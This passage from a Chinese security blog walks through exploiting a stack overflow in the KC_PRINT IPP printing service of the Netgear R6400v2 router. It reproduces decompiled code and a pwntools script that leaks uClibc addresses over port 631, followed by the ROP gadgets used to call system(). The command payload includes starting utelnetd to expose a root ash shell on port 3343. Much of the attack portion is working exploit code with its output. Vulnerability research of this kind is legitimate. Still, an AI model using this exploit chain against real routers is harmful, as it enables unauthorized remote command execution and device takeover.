<p>此处的 <code>copy_len</code>  是完全可控的， 且 <code>buf_2048</code>   在栈上， 我们只需让 <code>flag1</code>  不等于1 ， <code>flag2</code> 等于 1 ，就能进入到这个分支， 即满足  <code> *recv_buf == 1 &amp;&amp; !recv_buf[1]</code> 且 <code> recv_buf[offset] == 0x44</code> 条件即可。</p>
<h2 id="利用编写"><a href="#利用编写" class="headerlink" title="利用编写"></a>利用编写</h2><p>该程序保护都没有开启</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; checksec</span><br><span class="line">[*] <span class="string">&#x27;/workhub/Dropbox/Attachments/IoT and BaseBand/Router/Netgear/R6400v2/fs/squashfs-root/usr/bin/KC_PRINT&#x27;</span></span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8000)</span><br><span class="line"></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>既没有 <code>canary</code>  也没有 <code>PIE</code> ， 这极大的方便了我们的漏洞利用。  </p>
<p>系统随机化开启情况：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat /proc/sys/kernel/randomize_va_space</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p><code>ASLR</code> 等级为 1， 即栈和共享库是完全随机的， 但是堆的分配不随机。</p>
<p>我们的目的是通过这个栈溢出漏洞， 来达到任意命令执行的目的。我们检索这个程序，发现程序里并没有现成的 <code>system</code> 或者 <code>popen</code> 函数，因此 <code>ret2system</code> 的方法并不能直接使用， 因此我们需要绕过随机化，需要泄漏 <code>uclibc</code> 中的 <code>system</code> 地址， 因此首先需要一个信息泄漏的方法，来 leak <code>uclibc </code> 的加载基址。</p>
<h3 id="Bypass-ASLR"><a href="#Bypass-ASLR" class="headerlink" title="Bypass ASLR"></a>Bypass ASLR</h3><p>其实一般这种思路， 我们可以通过 ROP ， 调用 <code>write</code> 等函数读取  <code>got</code> 表中的值来做 <code>uclibc </code>的地址。 但是这个方法我们可能需要知道我们当前链接的 <code>fd</code> 。如果不知道 <code>fd</code> ， 我们可能需要爆破这个， 但由于这个程序是多线程而不是父子进程的形式， 如果失败可能会造成 crash。 </p>
<p>进一步分析函数， 以及阅读 slide  ，我们发现程序中有一个可以做任意地址读写的方法。</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-763f460331a41355beb24dcb1b383c47-159298.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-763f460331a41355beb24dcb1b383c47-159298.png"></a></p>
<p>我们可以通过栈溢出， 来覆盖 <code>prefix_ptr</code>  和 <code>prefix_size </code> 通过控制这两个变量，我们就可以通 <code>write_ipp_response</code>  将我们想读取的内容发送回来。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> command[<span class="number">64</span>]; <span class="comment">// [sp+24h] [bp-1090h] BYREF</span></span><br><span class="line"><span class="keyword">char</span> buf_2048[<span class="number">2048</span>]; <span class="comment">// [sp+64h] [bp-1050h] BYREF</span></span><br><span class="line"><span class="keyword">char</span> v9[<span class="number">2048</span>]; <span class="comment">// [sp+864h] [bp-850h] BYREF</span></span><br><span class="line"><span class="keyword">int</span> v10; <span class="comment">// [sp+1064h] [bp-50h]</span></span><br><span class="line"><span class="keyword">size_t</span> copy_len; <span class="comment">// [sp+1068h] [bp-4Ch]</span></span><br><span class="line"><span class="keyword">int</span> v12; <span class="comment">// [sp+106Ch] [bp-48h]</span></span><br><span class="line"><span class="keyword">size_t</span> cnt; <span class="comment">// [sp+1070h] [bp-44h]</span></span><br><span class="line"><span class="keyword">size_t</span> prefix_size; <span class="comment">// [sp+1074h] [bp-40h]</span></span><br><span class="line"><span class="keyword">int</span> total; <span class="comment">// [sp+1078h] [bp-3Ch]</span></span><br><span class="line"><span class="keyword">void</span> *prefix_ptr; <span class="comment">// [sp+107Ch] [bp-38h]</span></span><br><span class="line"><span class="keyword">int</span> v17; <span class="comment">// [sp+1080h] [bp-34h]</span></span><br><span class="line"><span class="keyword">int</span> client_sock; <span class="comment">// [sp+1084h] [bp-30h]</span></span><br><span class="line"><span class="keyword">int</span> v19; <span class="comment">// [sp+1088h] [bp-2Ch]</span></span><br><span class="line"><span class="keyword">int</span> v20; <span class="comment">// [sp+108Ch] [bp-28h]</span></span><br><span class="line"><span class="keyword">char</span> flag1; <span class="comment">// [sp+1093h] [bp-21h]</span></span><br><span class="line"><span class="keyword">char</span> v22; <span class="comment">// [sp+1094h] [bp-20h]</span></span><br><span class="line"><span class="keyword">char</span> job_state_resons; <span class="comment">// [sp+1095h] [bp-1Fh]</span></span><br><span class="line"><span class="keyword">char</span> job_state; <span class="comment">// [sp+1096h] [bp-1Eh]</span></span><br><span class="line"><span class="keyword">char</span> job_originating_user_name; <span class="comment">// [sp+1097h] [bp-1Dh]</span></span><br><span class="line"><span class="keyword">char</span> job_name; <span class="comment">// [sp+1098h] [bp-1Ch]</span></span><br><span class="line"><span class="keyword">char</span> job_id; <span class="comment">// [sp+1099h] [bp-1Bh]</span></span><br><span class="line"><span class="keyword">char</span> v28; <span class="comment">// [sp+109Ah] [bp-1Ah]</span></span><br><span class="line"><span class="keyword">char</span> flag2; <span class="comment">// [sp+109Bh] [bp-19h]</span></span><br><span class="line"><span class="keyword">size_t</span> final_size; <span class="comment">// [sp+109Ch] [bp-18h]</span></span><br><span class="line"><span class="keyword">int</span> offset; <span class="comment">// [sp+10A0h] [bp-14h]</span></span><br><span class="line"><span class="keyword">size_t</span> response_len; <span class="comment">// [sp+10A4h] [bp-10h]</span></span><br><span class="line"><span class="keyword">void</span> *final_ptr; <span class="comment">// [sp+10A8h] [bp-Ch]</span></span><br><span class="line"><span class="keyword">size_t</span> subffix_offset; <span class="comment">// [sp+10ACh] [bp-8h]</span></span><br></pre></td></tr></table></figure>

<p>最首先的想法肯定是通过覆盖 <code>prefix_ptr</code> 指向 <code>.got</code>  来做读写， 但是如果我们直接的指向了函数的 <code>.got</code>  , 例如 <code>strcpy_ptr</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.got:<span class="number">000180F</span>0 strcpy_ptr      DCD __imp_strcpy        ; DATA XREF: <span class="built_in">strcpy</span>+<span class="number">8</span></span><br></pre></td></tr></table></figure>

<p>但是在调用 <code>write_ipp_response</code> 后， 程序会 <code>free(prefix_ptr);</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v10 = write_ipp_response(client_sock, final_ptr, response_len);</span><br><span class="line"><span class="keyword">if</span> ( prefix_ptr )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(prefix_ptr);</span><br><span class="line">  prefix_ptr = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果是直接控制  <code>prefix_ptr == 000180F0</code> ， 在 <code>free</code> 的过程中会造成崩溃。 最后我们发现当把 <code>prefix_ptr </code> 指向 <code>.got</code>  的开头</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.got:<span class="number">000180E4</span>                                         ; sub_8C0C+<span class="number">8</span>↑o ...</span><br><span class="line">.got:<span class="number">000180E8</span>                 DCD <span class="number">0</span></span><br><span class="line">.got:<span class="number">000180</span>EC off_180EC       DCD <span class="number">0</span>                   ; DATA XREF: sub_8C0C+C↑r</span><br><span class="line">.got:<span class="number">000180F</span>0 strcpy_ptr      DCD __imp_strcpy        ; DATA XREF: <span class="built_in">strcpy</span>+<span class="number">8</span>↑r</span><br></pre></td></tr></table></figure>
<p>即将 <code>prefix_ptr</code> 指向  <code>000180E4</code>  是不会崩溃的。</p>
<blockquote>
<p>这里和 小伙伴  @aobo @leomxxj 讨论来下 ， 猜测应该是如果是 free(0x000180EC) ， 当 uclibc 会对  libc 的地址写， 造成 crash<br>如果 free(0x00180E4) </p>
<p>pwndbg&gt; telescope 0x000180E4<br>    00:0000│  0x180e4 —▸ 0x1800c ◂— 0x1<br>    01:0004│  0x180e8 —▸ 0x40024030 ◂— 0x0<br>pwndbg&gt; vmmap 0x1800c<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br> 0x18000    0x19000 rw-p     1000 10000  /usr/bin/KC_PRINT +0xc<br>0x1800c 地址是可读写的</p>
</blockquote>
<p>另外在编写这部分 exploit 的时候， 我们发现处理 <code>recv_buf</code> 消息的时候</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !flag1 )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">while</span> ( recv_buf[offset] != <span class="number">3</span> &amp;&amp; offset &lt;= content_len )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> ( recv_buf[offset] == <span class="number">0x44</span> &amp;&amp; !flag2 )</span><br><span class="line">     &#123;</span><br></pre></td></tr></table></figure>

<p>这部分是一个 <code>while</code> 循环，只有当消息为 <code>\x03</code> 的时候， 才会结束循环， 因此我们需要 <code>offset</code>  设置好， </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    offset += copy_len;</span><br><span class="line">.text:<span class="number">00010</span>A30                 LDR             R2, [R11,<span class="meta">#offset]</span></span><br><span class="line">.text:<span class="number">00010</span>A34                 LDR             R3, [R11,#copy_len]</span><br><span class="line">.text:<span class="number">00010</span>A38                 ADD             R3, R2, R3</span><br><span class="line">.text:<span class="number">00010</span>A3C                 STR             R3, [R11,#<span class="number">-0x14</span>]</span><br></pre></td></tr></table></figure>

<p>结束循环到 <code>write_ipp_response</code> 函数之前 ，我们还需要过两个地方， 第一个处， 为了方便我们在 <code>command</code>  前设置一个 <code>job-id</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">    offset += <span class="number">2</span>;                              <span class="comment">// offset 14</span></span><br><span class="line">    <span class="keyword">if</span> ( flag2 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memset</span>(command, <span class="number">0</span>, <span class="keyword">sizeof</span>(command));</span><br><span class="line">      <span class="built_in">memcpy</span>(command, &amp;recv_buf[offset], copy_len);</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-media-sheets-completed&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v22 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-state-reasons&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        job_state_resons = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-name&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        job_name = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-originating-user-name&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        job_originating_user_name = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-state&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        job_state = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-id&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        job_id = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v28 )</span><br><span class="line">        &#123;</span><br><span class="line">          buf_2048[subffix_offset++] = <span class="number">68</span>;</span><br><span class="line">          buf_2048[subffix_offset++] = <span class="number">0</span>;</span><br><span class="line">          buf_2048[subffix_offset++] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cnt = memcpy_n(buf_2048, subffix_offset, &amp;recv_buf[offset - <span class="number">2</span>], copy_len + <span class="number">2</span>);</span><br><span class="line">        subffix_offset += cnt;</span><br><span class="line">        v28 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    offset += copy_len;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">final_size += prefix_size;</span><br><span class="line"><span class="keyword">if</span> ( flag1 )</span><br><span class="line">  v20 = sub_11D68(v17, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, v9);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  v20 = sub_11D68(v17, job_id, job_name, job_originating_user_name, job_state, job_state_resons, v22, v9);</span><br><span class="line"><span class="keyword">if</span> ( v20 &gt; <span class="number">0</span> )</span><br></pre></td></tr></table></figure>

<p>第二处 <code>final_ptr = malloc(++final_size);</code> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">LABEL_54:</span><br><span class="line">    *(final_ptr + response_len++) = <span class="number">3</span>;</span><br><span class="line">    v10 = write_ipp_response(client_sock, final_ptr, response_len);</span><br><span class="line">    <span class="keyword">if</span> ( prefix_ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(prefix_ptr);</span><br><span class="line">      prefix_ptr = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( final_ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(final_ptr);</span><br><span class="line">      final_ptr = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v10 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  final_ptr = <span class="built_in">malloc</span>(++final_size);</span><br><span class="line">  <span class="keyword">if</span> ( final_ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(final_ptr, <span class="number">0</span>, final_size);</span><br><span class="line">    cnt = memcpy_n(final_ptr, response_len, prefix_ptr, prefix_size);</span><br><span class="line">    response_len += cnt;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>我们得让 <code>final_size</code> 的值不能太大，不然分配不出来程序就不会走到 <code>write_ipp_response</code> 里，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00010D78 loc_10D78                               ; CODE XREF: Response_Get_Jobs+868↑j</span><br><span class="line">.text:00010D78                 LDR             R3, [R11,#-0x18]</span><br><span class="line">.text:00010D7C                 ADD             R3, R3, #1</span><br><span class="line">.text:00010D80                 STR             R3, [R11,#-0x18]</span><br><span class="line">.text:00010D84                 LDR             R3, [R11,#-0x18]</span><br><span class="line">.text:00010D88                 MOV             R0, R3  ; size</span><br><span class="line">.text:00010D8C                 BL              malloc</span><br></pre></td></tr></table></figure>

<p>即需要设置 <code>[R11, #-0x18]</code> 的值， 这是在栈上的。 最后我 leak 的代码大致如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_uclibc</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># recv_buf[2] || recv_buf[3] == 10</span></span><br><span class="line">    recv_buf1  = <span class="string">b&#x27;\x00\x00\x00\x0a\x00\x00\x99\x99&#x27;</span></span><br><span class="line">    recv_buf2  = <span class="string">b&#x27;\x00\x44\x00\x00\x10\x5d&#x27;</span> <span class="comment"># 0x1050 is copy_len -&gt; memcpy(command, &amp;recv_buf[offset], copy_len);</span></span><br><span class="line">    recv_buf2 += <span class="string">b&#x27;job-id\x00\x00&#x27;</span> </span><br><span class="line"></span><br><span class="line">    junkdata = cyclic(<span class="number">0x104c</span> , n=<span class="number">4</span>)</span><br><span class="line">    junkdata = <span class="built_in">bytearray</span>(junkdata)</span><br><span class="line">    junkdata[<span class="number">1026</span>: <span class="number">1026</span>+ <span class="built_in">len</span>(cmd)] = cmd</span><br><span class="line">    junkdata[<span class="number">0x103c</span>: <span class="number">0x103c</span> + <span class="number">4</span>] = p32(<span class="number">0x106a</span>-<span class="number">0xe</span>) <span class="comment"># finish flag offset</span></span><br><span class="line">    junkdata[<span class="number">0x1048</span>: <span class="number">0x1048</span> + <span class="number">4</span>] = p32(<span class="number">0x20</span>)     <span class="comment"># malloc size  - &gt; final_ptr = malloc(++final_size);</span></span><br><span class="line">    junkdata = <span class="built_in">bytes</span>(junkdata)</span><br><span class="line"></span><br><span class="line">    recv_buf2 += junkdata</span><br><span class="line">    recv_buf2 += p32(<span class="number">20</span>)       <span class="comment"># overwrite  prrefix_size</span></span><br><span class="line">    recv_buf2 += p32(<span class="number">0x180E4</span>)  <span class="comment"># overwrite  prefix_ptr -&gt; .got start address then free is alive </span></span><br><span class="line">    recv_buf2 += <span class="string">b&#x27;\x03&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload =  <span class="string">b&#x27;POST /USB1_LQ\r\n&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;Content-Length: %b\r\n&#x27;</span> % <span class="built_in">str</span>(<span class="built_in">len</span>(recv_buf1 + recv_buf2)).encode(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line">    p = remote(<span class="string">&quot;192.168.1.1&quot;</span>, <span class="number">631</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.send(recv_buf1)</span><br><span class="line">    p.send(recv_buf2)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;\r\n\r\n&#x27;</span>)</span><br><span class="line">    p.recvn(<span class="number">8</span>)</span><br><span class="line">    _dl_linux_resolve = u32(p.recvn(<span class="number">4</span>)) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;_dl_linux_resolve : &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(_dl_linux_resolve))</span><br><span class="line">    ld_uClibc =  _dl_linux_resolve - <span class="number">0x3e70</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;ld_uClibc : &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(ld_uClibc))</span><br><span class="line">    p.recvn(<span class="number">4</span>)</span><br><span class="line">    printf_addr = u32(p.recvn(<span class="number">4</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;printf : &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(printf_addr))</span><br><span class="line">    uClibc = printf_addr - <span class="number">0x360e0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;uClibc : &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(uClibc))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># system = uClibc + +0x90f4 # system offset </span></span><br><span class="line">    <span class="comment"># print(&#x27;system : &#123;:#x&#125;&#x27;.format(system))</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ld_uClibc, uClibc</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Leak:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ python3 exp_ncc_netgear_ipp.py</span><br><span class="line">[+] Opening connection to 192.168.1.1 on port 631: Done</span><br><span class="line">_dl_linux_resolve : 0x40021e70</span><br><span class="line">ld_uClibc : 0x4001e000</span><br><span class="line"><span class="built_in">printf</span> : 0x401700e0</span><br><span class="line">uClibc : 0x4013a000</span><br></pre></td></tr></table></figure>

<h3 id="Arbitrary-command-execution"><a href="#Arbitrary-command-execution" class="headerlink" title="Arbitrary command execution"></a>Arbitrary command execution</h3><p>通过泄漏 uclibc 的地址， 然后可以计算 <code>system</code>  的地址。 然后我们就可以进一步做劫持返回地址工作。首先我们需要有个一个地址来存储我们 <code>system</code> 将执行的字符串。 回顾上文， 我们提及到了系统的随机化等级为 <code>1</code> 。</p>
<p>系统随机化开启情况：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat /proc/sys/kernel/randomize_va_space</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p>因此我们可以在堆上查找是否有可控的内容， 通过 <code>hexdump</code> 查找。</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-e8f8895596ce61800699e533f9d7c442-efc4ee.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-e8f8895596ce61800699e533f9d7c442-efc4ee.png"></a></p>
<p>我们发现我们的 payload 会存储在 堆上， 因此 ， 我们可以将要执行的命令， 在第一次链接的时候 ， 就将命令写入。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cmd = <span class="string">b&#x27;/bin/utelnetd -p 3343 -l /bin/ash \x00&#x27;</span></span><br><span class="line">cmd = <span class="string">b&#x27;/bin/touch /tmp/hacked&#x27;</span></span><br><span class="line">cmd += <span class="string">b&quot;\x00&quot;</span> * (<span class="built_in">len</span>(cmd) % <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_uclibc</span>():</span></span><br><span class="line">		...</span><br><span class="line">    junkdata[<span class="number">1026</span>: <span class="number">1026</span>+ <span class="built_in">len</span>(cmd)] = cmd</span><br></pre></td></tr></table></figure>

<p>在覆盖返回地址之前 ， 除了在 leak 需要注意的那几个变量以外 ，我们还需要单独注意</p>
<ul>
<li>flag1</li>
<li>v17</li>
<li>response_len</li>
</ul>
<p>等变量的值， 要单独重新赋值。</p>
<p>最后我们需要将 <code>R0</code> 的值指向堆上的 <code>0x1b880</code> 地址。 所以我们需要单独几个 <code>gadget</code> ， 这里我使用的是两个 <code>gadget</code> 。</p>
<p>首先通过第一个  <code>gadget</code>  控制 <code>R3</code>  为 0x1b880</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00001504 : pop &#123;r3, r4, fp, pc&#125;</span><br></pre></td></tr></table></figure>

<p>然后通过 第二个 <code>gadget</code>  将 <code>R3</code> 的值赋值给 <code>R0</code> 并且控制 PC 跳转到 <code>system</code> 函数上，从而完成任意命令执行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00000a80 : mov r0, r3 ; pop &#123;fp, pc&#125;</span><br></pre></td></tr></table></figure>

<p>最后就可以完成任意命令执行了。</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-657974c446c112a83a99c724fa6581d1-a39218.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-657974c446c112a83a99c724fa6581d1-a39218.png"></a></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://research.nccgroup.com/2022/08/30/ncc-con-europe-2022-pwn2own-austin-presentations/">NCC Con Europe 2022 – Pwn2Own Austin Presentations</a></p>
</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
        var options = {
            selector: '.gallery-item'
        };
        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
        }</script>
</div>


  <footer class="post-footer">
  
    <div class="post-tags">
      
        <a href="/tags/netgear/" class="tag">netgear</a>
      
    </div>
  
</footer>


  
<nav class="post-nav">
  
    <div class="post-nav-item prev">
      <span class="post-nav-label">&larr; Prev</span>
      <a href="/CVE-2022-32548-DrayTeck-BufferOverflow.html" class="post-nav-title">
        CVE-2022-32548 DrayTeck 栈溢出漏洞分析
      </a>
    </div>
  

  
    <div class="post-nav-item next">
      <span class="post-nav-label">Next &rarr;</span>
      <a href="/2022-QWB-Final-RealWorld-Challenge-Writeup.html" class="post-nav-title">
        2022 QWB Final RealWorld Challenge Writeup
      </a>
    </div>
  
</nav>



  
</article>

        </div>
      
    </main>

    <footer class="footer">
  <div class="footer-content">
    <div class="footer-left">
      
      <span class="copyright">
        &copy; 2024 - 2026 Swing
      </span>
    </div>

    <div class="footer-right">
      
        <span class="powered">
